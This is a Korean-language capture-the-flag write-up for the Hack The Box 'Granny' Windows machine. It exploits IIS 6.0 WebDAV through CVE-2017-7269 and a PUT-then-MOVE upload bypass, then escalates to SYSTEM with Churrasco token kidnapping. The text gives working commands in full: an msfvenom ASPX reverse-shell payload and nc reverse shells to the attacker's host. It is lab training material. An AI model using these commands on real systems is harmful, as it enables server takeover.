# HTB Granny Writeup

**OS:** Windows  
**Difficulty:** Easy  
**IP:** 10.129.95.234

---

## 정보 수집

### Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.95.234
nmap -sV -sC -p 80 10.129.95.234
```

**결과:**

|PORT|STATE|SERVICE|VERSION|
|---|---|---|---|
|80/tcp|open|http|Microsoft IIS httpd 6.0|

### 상세 스캔 결과

- **WebDAV** 활성화 확인
- **ASP.NET** 프레임워크 실행 중
- **취약 CVE:** CVE-2017-7269 (IIS 6.0 + WebDAV RCE)

**허용된 HTTP 메서드:**

```
OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE,
PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK, PUT
```

> nmap 스크립트: `http-webdav-scan`, `http-methods`

---

## 취약점 분석

### CVE-2017-7269

- IIS 6.0 + WebDAV의 ScStoragePathFromUrl 함수 버퍼 오버플로우
- 원격 코드 실행 가능
- Metasploit 모듈: `exploit/windows/iis/iis_webdav_scstoragepathfromurl`

### WebDAV PUT 업로드 취약점

- PUT 메서드로 파일 업로드 가능
- `.aspx` 직접 업로드는 차단됨
- **우회법:** `.txt`로 업로드 후 `MOVE`로 `.aspx`로 변환

---

## 초기 침투 방법 1 - Metasploit (CVE-2017-7269)

```bash
msfconsole
msf> use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf> set RHOSTS 10.129.95.234
msf> set LHOST 10.10.17.240
msf> run
```

**Meterpreter 세션 획득!**

```
[*] Meterpreter session 1 opened
```

> ⚠️ 세션이 불안정함 → `getuid` 실패 시 프로세스 마이그레이션 필요

```
meterpreter > migrate -N w3wp.exe
```

---

## 초기 침투 방법 2 - 수동 (WebDAV PUT + MOVE)

### 1. ASPX 리버스쉘 생성

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.240 LPORT=4444 -f aspx -o shell.aspx
mv shell.aspx shell.txt
```

### 2. PUT으로 업로드

```bash
curl -X PUT http://10.129.95.234/shell.txt --data-binary @shell.txt -H "Content-Type: text/plain"
```

### 3. MOVE로 aspx로 변환

```bash
curl -X MOVE --header 'Destination:http://10.129.95.234/shell.aspx' 'http://10.129.95.234/shell.txt'
```

### 4. nc 리스너 실행

```bash
nc -nvlp 4444
```

### 5. 브라우저에서 실행

```
http://10.129.95.234/shell.aspx
```

**쉘 획득! (NETWORK SERVICE 권한)**

---

## 권한 상승 (Privilege Escalation)

### 시스템 정보 확인

```
OS: Windows Server 2003
User: NT AUTHORITY\NETWORK SERVICE
```

### Token Kidnapping (Churrasco)

Windows Server 2003은 **Token Kidnapping** 취약점에 취약

**1. churrasco.exe 다운로드 (Kali)**

```bash
wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
cp /usr/share/windows-resources/binaries/nc.exe .
```

**2. SMB 서버로 업로드**

```bash
impacket-smbserver smb . -smb2support
```

**3. 쉘에서 파일 복사**

```
# churrasco.exe 업로드 (txt로 위장 후 MOVE)
curl -X PUT http://10.129.95.234/churrasco.txt --data-binary @churrasco.exe -H "Content-Type: text/plain"
curl -X MOVE --header 'Destination:http://10.129.95.234/churrasco.exe' 'http://10.129.95.234/churrasco.txt'

# nc.exe도 동일하게 업로드
curl -X PUT http://10.129.95.234/nc.txt --data-binary @nc.exe -H "Content-Type: text/plain"
curl -X MOVE --header 'Destination:http://10.129.95.234/nc.exe' 'http://10.129.95.234/nc.txt'
```

**4. 쉘에서 실행 위치 이동**

```
cd C:\Inetpub\wwwroot
```

**5. Kali에서 새 리스너**

```bash
nc -nvlp 5555
```

**6. SYSTEM 리버스쉘 실행**

```
churrasco.exe -d "\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.17.240 5555"
```

**NT AUTHORITY\SYSTEM 획득!**

---

## 플래그 획득

```
# User Flag
more C:\"Documents and Settings"\lakis\desktop\user.txt

# Root Flag
more C:\"Documents and Settings"\Administrator\Desktop\root.txt
```

---

## 공격 흐름 요약

```
Nmap 스캔
  → IIS 6.0 + WebDAV 발견
    → CVE-2017-7269 또는 PUT/MOVE로 ASPX 웹쉘 업로드
      → NETWORK SERVICE 쉘 획득
        → Windows Server 2003 Token Kidnapping
          → churrasco.exe + nc.exe 업로드
            → SYSTEM 쉘 획득 🏆
```

---

## 핵심 명령어 정리

|목적|명령어|
|---|---|
|WebDAV 스캔|`nmap -sV -sC -p 80 <IP>`|
|Metasploit 익스플로잇|`use exploit/windows/iis/iis_webdav_scstoragepathfromurl`|
|파일 업로드|`curl -X PUT http://<IP>/file.txt --data-binary @file`|
|파일 이름 변경|`curl -X MOVE --header 'Destination:http://<IP>/file.aspx' 'http://<IP>/file.txt'`|
|SYSTEM 권한 상승|`churrasco.exe -d "<command>"`|

---

## 배운 점

- IIS 6.0 + WebDAV → CVE-2017-7269 RCE
- WebDAV PUT 메서드로 파일 업로드 가능
- `.aspx` 직접 업로드 차단 → `.txt`로 업로드 후 MOVE로 우회
- Metasploit 세션이 불안정하면 수동 방법이 더 안정적
- Windows Server 2003 → Token Kidnapping (churrasco.exe)
- `davtest`로 허용된 파일 타입 미리 확인 가능
- `C:\Documents and Settings\` 경로는 공백 때문에 따옴표로 감싸야 함